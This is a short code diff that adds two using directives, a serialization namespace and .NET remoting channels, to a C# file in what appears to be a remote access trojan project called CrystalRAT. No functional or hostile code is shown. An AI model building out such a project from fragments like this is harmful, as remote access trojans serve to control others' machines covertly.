@@ -1,10 +1,12 @@
 ﻿using CrystalRATShared.Commands;
 using CrystalRATShared.EvArgs;
+using CrystalRATShared.Serialization;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Runtime.CompilerServices;
+using System.Runtime.Remoting.Channels;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
